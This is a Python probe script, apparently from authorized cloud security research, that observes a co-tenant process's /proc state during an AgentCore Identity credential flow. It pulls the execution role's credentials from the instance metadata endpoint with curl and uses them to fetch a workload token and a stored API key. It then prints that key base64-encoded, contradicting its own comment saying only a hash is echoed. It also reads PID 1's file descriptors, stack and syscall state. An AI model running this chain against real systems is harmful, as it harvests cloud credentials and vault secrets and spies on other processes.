"""
probe_stage7_identity_obs.py — observe loopy.server's process state during
an AgentCore Identity flow.

The shell-tool position can talk to bedrock-agentcore Identity DP directly
using exec-role IMDS creds (like a customer agent doing skill-hosted credential
fetch). While that flow runs, we sample PID 1's /proc surface every 100ms
to catch transient process state — open FDs (httpx may open new sockets to
the Identity endpoint), syscall position, memory (/proc/1/statm), io counters,
network counters in /proc/net/{tcp,tcp6}.

Goal: characterize what a vault-resolution flow LOOKS like to a co-tenant
process observer (us). If interesting transient state appears, that's
disclosure shape.

Sequence:
  1. Pre-snapshot: PID 1 /proc/{status,io,statm,fdinfo/*,net/snmp}, /proc/net/tcp.
  2. Spawn background poller that snapshots every 100ms for 6s.
  3. Call bedrock-agentcore data-plane GetWorkloadAccessToken
     + GetResourceApiKey on `acab088-vault-probe-apikey` and capture the
     canary value (re-confirms #3747844 chain on modern substrate).
  4. Wait 1s, kill poller.
  5. Diff snapshots — surface anything that changed during the window.

Read-only on PID 1 surfaces. Authorized research; account owner is the
test target.
"""

import os
import sys
import json
import base64
import time
import threading
import subprocess
import urllib.parse


def _b64(data):
    if isinstance(data, str):
        data = data.encode()
    return base64.b64encode(data).decode()


def _safe_read(path, max_bytes=64 * 1024):
    try:
        with open(path, 'rb') as f:
            return f.read(max_bytes)
    except Exception as e:
        return f'<read-error:{type(e).__name__}:{e}>'.encode()


def _safe_readlink(path):
    try:
        return os.readlink(path)
    except Exception:
        return None


def snapshot_pid1():
    snap = {'t': time.monotonic_ns()}
    snap['status'] = _safe_read('/proc/1/status', 16 * 1024).decode(
        'utf-8', errors='replace')
    snap['io'] = _safe_read('/proc/1/io').decode('utf-8', errors='replace')
    snap['statm'] = _safe_read('/proc/1/statm').decode(
        'utf-8', errors='replace').strip()
    snap['stat'] = _safe_read('/proc/1/stat').decode(
        'utf-8', errors='replace').strip()
    snap['syscall'] = _safe_read('/proc/1/syscall').decode(
        'utf-8', errors='replace').strip()
    snap['wchan'] = _safe_read('/proc/1/wchan').decode(
        'utf-8', errors='replace').strip()
    snap['stack'] = _safe_read('/proc/1/stack', 4 * 1024).decode(
        'utf-8', errors='replace')
    # FD targets — readlink each
    fd_targets = {}
    try:
        for fd in os.listdir('/proc/1/fd'):
            t = _safe_readlink(f'/proc/1/fd/{fd}')
            if t:
                fd_targets[fd] = t
    except Exception:
        pass
    snap['fds'] = fd_targets
    # /proc/net counters
    snap['net_snmp'] = _safe_read('/proc/net/snmp').decode(
        'utf-8', errors='replace')
    # /proc/net/tcp — grep for ESTABLISHED only (state 01)
    tcp_data = _safe_read('/proc/net/tcp').decode(
        'utf-8', errors='replace')
    tcp6_data = _safe_read('/proc/net/tcp6').decode(
        'utf-8', errors='replace')
    snap['tcp_lines'] = [
        line for line in tcp_data.splitlines()[1:]
        if line.split() and line.split()[3] == '01']  # ESTABLISHED
    snap['tcp6_lines'] = [
        line for line in tcp6_data.splitlines()[1:]
        if line.split() and line.split()[3] == '01']
    return snap


class Poller(threading.Thread):
    def __init__(self, interval_s=0.1, max_snapshots=80):
        super().__init__(daemon=True)
        self.interval_s = interval_s
        self.max = max_snapshots
        self.snapshots = []
        self.stop_flag = threading.Event()

    def run(self):
        while not self.stop_flag.is_set() and len(self.snapshots) < self.max:
            try:
                s = snapshot_pid1()
                self.snapshots.append(s)
            except Exception as e:
                self.snapshots.append({'err': str(e)})
            time.sleep(self.interval_s)

    def stop(self):
        self.stop_flag.set()


def diff_snapshots(snaps):
    """Return a structured diff between earliest and latest snapshot."""
    if len(snaps) < 2:
        return {}
    a, b = snaps[0], snaps[-1]
    diff = {}
    # io counters
    for label in ('rchar:', 'wchar:', 'syscr:', 'syscw:',
                  'read_bytes:', 'write_bytes:'):
        try:
            av = int([l for l in a['io'].splitlines()
                     if l.startswith(label)][0].split(':')[1])
            bv = int([l for l in b['io'].splitlines()
                     if l.startswith(label)][0].split(':')[1])
            if bv != av:
                diff[label.rstrip(':')] = bv - av
        except Exception:
            pass
    # FD churn
    a_fds = set(a.get('fds', {}).items())
    b_fds = set(b.get('fds', {}).items())
    appeared = b_fds - a_fds
    disappeared = a_fds - b_fds
    diff['fd_appeared'] = list(appeared)
    diff['fd_disappeared'] = list(disappeared)
    # TCP-established churn
    a_tcp = set(a.get('tcp_lines', []) + a.get('tcp6_lines', []))
    b_tcp = set(b.get('tcp_lines', []) + b.get('tcp6_lines', []))
    diff['tcp_appeared'] = list(b_tcp - a_tcp)
    diff['tcp_disappeared'] = list(a_tcp - b_tcp)
    # statm churn (resident memory changes)
    diff['statm_a'] = a.get('statm')
    diff['statm_b'] = b.get('statm')
    return diff


def all_distinct_fd_targets(snaps):
    """Across all snapshots, set of distinct FD targets observed."""
    seen = {}
    for s in snaps:
        for fd, target in s.get('fds', {}).items():
            seen.setdefault(target, set()).add(fd)
    return {k: sorted(v) for k, v in seen.items()}


def all_distinct_tcp(snaps):
    seen = set()
    for s in snaps:
        seen.update(s.get('tcp_lines', []))
        seen.update(s.get('tcp6_lines', []))
    return list(seen)


def main():
    print('PROBE=stage7-identity-obs v1')

    # --- pre-snapshot ---
    pre = snapshot_pid1()
    print(f'S7_PRE_FD_COUNT={len(pre.get("fds", {}))}')
    print(f'S7_PRE_TCP_EST={len(pre.get("tcp_lines", [])) + len(pre.get("tcp6_lines", []))}')
    print(f'S7_PRE_STATM={pre.get("statm")}')
    print(f'S7_PRE_IO={_b64(pre.get("io").encode())}')

    # --- start poller ---
    poller = Poller(interval_s=0.1, max_snapshots=80)
    poller.start()
    time.sleep(0.3)

    # --- IMDS exec role -> boto3 -> Identity DP ---
    print('S7_FLOW_START=' + str(time.monotonic_ns()))
    try:
        rc, tok, _ = subprocess.run(
            ['curl', '-s', '-m', '5', '-X', 'PUT',
             'http://169.254.169.254/latest/api/token',
             '-H', 'X-aws-ec2-metadata-token-ttl-seconds: 60'],
            capture_output=True, timeout=8).returncode, b'', b''
        # actually do it properly
        import subprocess as sp
        r = sp.run(['curl', '-s', '-m', '5', '-X', 'PUT',
                    'http://169.254.169.254/latest/api/token',
                    '-H', 'X-aws-ec2-metadata-token-ttl-seconds: 60'],
                   capture_output=True, timeout=8)
        token = r.stdout.strip().decode()
        r2 = sp.run(['curl', '-s', '-m', '5',
                     'http://169.254.169.254/latest/meta-data/iam/security-credentials/execution_role',
                     '-H', f'X-aws-ec2-metadata-token: {token}'],
                    capture_output=True, timeout=8)
        creds = json.loads(r2.stdout.decode())
        os.environ['AWS_ACCESS_KEY_ID'] = creds['AccessKeyId']
        os.environ['AWS_SECRET_ACCESS_KEY'] = creds['SecretAccessKey']
        os.environ['AWS_SESSION_TOKEN'] = creds['Token']
        print(f'S7_AKIA={creds["AccessKeyId"][:6]}')
    except Exception as e:
        print(f'S7_IMDS_ERR={type(e).__name__}:{e}')
        poller.stop()
        print('END')
        return

    try:
        import boto3
        from botocore.exceptions import ClientError
        dp = boto3.client('bedrock-agentcore', region_name='us-east-1')

        # Step A — GetWorkloadAccessToken for the canary workload identity.
        wat = dp.get_workload_access_token(workloadName='acab088-vault-probe-wi')
        wat_token = wat.get('workloadAccessToken')
        print(f'S7_WAT_LEN={len(wat_token) if wat_token else 0}')

        time.sleep(0.5)  # let pollers see this

        # Step B — GetResourceApiKey with the workload token, asking for the
        # canary apikey provider's resolved value (the actual #3747844 chain).
        api = dp.get_resource_api_key(
            workloadIdentityToken=wat_token,
            resourceCredentialProviderName='acab088-vault-probe-apikey',
        )
        api.pop('ResponseMetadata', None)
        # The canary value should be in `apiKey`
        canary = api.get('apiKey', '')
        # SHA only — don't echo raw canary back
        import hashlib
        if canary:
            print(f'S7_APIKEY_LEN={len(canary)}')
            print(f'S7_APIKEY_SHA256={hashlib.sha256(canary.encode()).hexdigest()}')
            # Verify it matches the planted canary
            EXPECTED = 'IDENT-APIKEY-CANARY-9F3E2B1A-DO-NOT-USE'
            print(f'S7_APIKEY_MATCHES_CANARY={canary == EXPECTED}')
            print(f'S7_APIKEY_VALUE={_b64(canary.encode())}')
        else:
            print('S7_APIKEY_EMPTY=1')
    except ClientError as e:
        print(f'S7_BOTO_CLIENT_ERROR={e.response["Error"]["Code"]}:'
              f'{e.response["Error"].get("Message","")[:200]}')
    except Exception as e:
        print(f'S7_BOTO_ERR={type(e).__name__}:{str(e)[:200]}')

    # Let pollers settle
    time.sleep(0.5)
    poller.stop()
    poller.join(timeout=2)
    print(f'S7_FLOW_END=' + str(time.monotonic_ns()))
    print(f'S7_SNAPSHOT_COUNT={len(poller.snapshots)}')

    # --- post-snapshot ---
    post = snapshot_pid1()
    print(f'S7_POST_FD_COUNT={len(post.get("fds", {}))}')
    print(f'S7_POST_TCP_EST={len(post.get("tcp_lines", [])) + len(post.get("tcp6_lines", []))}')
    print(f'S7_POST_STATM={post.get("statm")}')
    print(f'S7_POST_IO={_b64(post.get("io").encode())}')

    # --- diff ---
    if poller.snapshots:
        d = diff_snapshots([pre] + poller.snapshots + [post])
        print(f'S7_DIFF={_b64(json.dumps(d, default=str).encode())}')

        # Distinct FD targets seen during the window
        fd_targets = all_distinct_fd_targets([pre] + poller.snapshots + [post])
        # Filter for non-anon-pipe-socket / interesting paths
        interesting = {k: v for k, v in fd_targets.items()
                       if not k.startswith('socket:[') and 'pipe:' not in k}
        print(f'S7_FD_DISTINCT_NONSOCK={_b64(json.dumps(interesting).encode())}')

        # Sockets: some might be transient — list ALL socket inodes seen
        sock_inodes = sorted({k for k in fd_targets if k.startswith('socket:[')})
        print(f'S7_FD_DISTINCT_SOCKETS_COUNT={len(sock_inodes)}')
        print(f'S7_FD_DISTINCT_SOCKETS={_b64(json.dumps(sock_inodes).encode())}')

        # All distinct TCP-established peers seen during window
        tcp_seen = all_distinct_tcp([pre] + poller.snapshots + [post])
        print(f'S7_TCP_DISTINCT={_b64(json.dumps(tcp_seen).encode())}')

        # Highlight any TCP that was only seen briefly (transient)
        # Build map of {tcp_line: count_of_snapshots_seen}
        from collections import Counter
        cnt = Counter()
        for s in [pre] + poller.snapshots + [post]:
            for line in s.get('tcp_lines', []) + s.get('tcp6_lines', []):
                cnt[line] += 1
        transient = {line: c for line, c in cnt.items()
                     if c < len(poller.snapshots) // 4}
        print(f'S7_TCP_TRANSIENT_COUNT={len(transient)}')
        print(f'S7_TCP_TRANSIENT={_b64(json.dumps(transient).encode())}')

    print('END')


if __name__ == '__main__':
    main()
